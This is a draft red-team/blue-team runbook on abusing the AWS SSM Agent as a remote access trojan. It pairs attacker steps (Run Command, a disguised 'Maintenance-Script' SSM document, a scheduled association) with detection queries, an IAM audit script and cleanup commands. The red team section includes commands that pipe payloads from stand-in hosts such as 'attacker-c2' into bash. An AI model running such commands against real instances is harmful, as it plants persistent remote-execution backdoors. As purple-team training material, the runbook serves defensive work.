# SSM Agent Hijacking: Blue Team vs. Red Team Runbook  ** DRAFT **

##
#
https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan
#
[https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan
](https://thehackernews.com/2023/08/researchers-uncover-aws-ssm-agent.html)#
#
##

## Overview

The Mitiga research shows how AWS Systems Manager (SSM) Agent can be abused as a Remote Access Trojan, allowing attackers to maintain persistent access to compromised systems while evading detection.

## Red Team Playbook

### Reconnaissance
- Identify EC2 instances with SSM Agent installed
- Discover IAM roles/policies with SSM permissions
- Enumerate existing SSM documents and associations

### Initial Access Methods
- Compromise AWS credentials with SSM permissions
- Target instances with overly permissive IAM roles
- Exploit misconfigured SSM documents

### SSM Agent Exploitation Techniques
1. **Execution via Run Command**
   - Use AWS CLI to send malicious commands:
     ```bash
     aws ssm send-command --document-name "AWS-RunShellScript" \
       --targets "Key=instanceids,Values=i-1234567890abcdef0" \
       --parameters 'commands=["malicious command here"]'
     ```

2. **Persistence via SSM Documents**
   - Create custom SSM documents for backdoor access:
     ```bash
     aws ssm create-document --name "Maintenance-Script" \
       --content '{"schemaVersion":"2.2","description":"Legitimate maintenance","mainSteps":[{"action":"aws:runShellScript","name":"runShellScript","inputs":{"runCommand":["curl https://malicious-domain/payload | bash"]}}]}'
     ```

3. **Lateral Movement**
   - Pivot through instances managed by SSM
   - Chain command execution across multiple targets
   
4. **Create Malicious SSM Associations**
   - Configure scheduled execution:
     ```bash
     aws ssm create-association --name "AWS-RunShellScript" \
       --targets "Key=tag:Environment,Values=Production" \
       --parameters "commands=[\"curl -s https://attacker-c2/payload | bash\"]" \
       --schedule-expression "rate(30 minutes)"
     ```

## Blue Team Playbook

### Prevention
1. **IAM Controls**
   - Implement least privilege for SSM permissions
   - Regularly audit IAM policies with SSM access
   - Sample policy review script:
     ```python
     import boto3
     import json
     
     iam = boto3.client('iam')
     
     def check_ssm_permissions(policy_document):
         # Check for overly permissive SSM permissions
         for statement in policy_document.get('Statement', []):
             if statement.get('Effect') == 'Allow':
                 actions = statement.get('Action', [])
                 if isinstance(actions, str):
                     actions = [actions]
                 for action in actions:
                     if action == 'ssm:*' or action == '*':
                         return True
         return False
     ```

2. **Network Controls**
   - Implement VPC endpoints for SSM to restrict traffic
   - Configure security groups to limit SSM communication
   - Monitor and alert on unusual network traffic patterns

### Detection
1. **CloudTrail Monitoring**
   - Alert on suspicious SSM API calls:
     ```
     eventSource = ssm.amazonaws.com AND 
     (eventName = SendCommand OR 
      eventName = CreateDocument OR 
      eventName = CreateAssociation)
     ```

2. **SSM Document Inventory**
   - Baseline legitimate SSM documents
   - Regularly scan for unauthorized documents:
     ```bash
     aws ssm list-documents --filters "Key=Owner,Values=Self" --output json
     ```

3. **Command Execution Auditing**
   - Monitor SSM command history for anomalies:
     ```bash
     aws ssm list-command-invocations --details
     ```

4. **Session Monitoring**
   - Track SSM Session Manager usage:
     ```bash
     aws ssm describe-sessions --state Active
     ```

### Response
1. **Incident Containment**
   - Revoke compromised IAM credentials
   - Isolate affected instances
   - Block suspicious IP addresses

2. **Eradication**
   - Delete unauthorized SSM documents:
     ```bash
     aws ssm delete-document --name "Suspicious-Document-Name"
     ```
   - Terminate malicious associations:
     ```bash
     aws ssm delete-association --association-id "association-id"
     ```

3. **Recovery**
   - Restore from known good backups
   - Re-deploy instances from verified AMIs
   - Implement enhanced monitoring

## Purple Team Exercise Scenarios

### Scenario 1: Persistent Access via SSM
- **Red Team Objective**: Establish persistent access using SSM associations
- **Blue Team Challenge**: Detect and respond to unauthorized associations
- **Success Criteria**: Blue team detects and remediates within 4 hours

### Scenario 2: Credential Theft and SSM Abuse
- **Red Team Objective**: Obtain AWS credentials and abuse SSM permissions
- **Blue Team Challenge**: Detect suspicious SSM activity patterns
- **Success Criteria**: Proper alerting and privilege escalation detection

### Scenario 3: Stealthy Command Execution
- **Red Team Objective**: Execute commands via SSM that evade typical detection
- **Blue Team Challenge**: Enhance monitoring to catch evasive techniques
- **Success Criteria**: Development of new detection capabilities

## Exercise Planning
1. **Pre-exercise**
   - Create isolated AWS environment for testing
   - Define clear boundaries and safety protocols
   - Establish communication channels

2. **During Exercise**
   - Document all actions with timestamps
   - Monitor for unintended consequences
   - Maintain regular checkpoints

3. **Post-exercise**
   - Review findings and gaps
   - Update security controls based on lessons learned
   - Develop enhanced detection and response capabilities

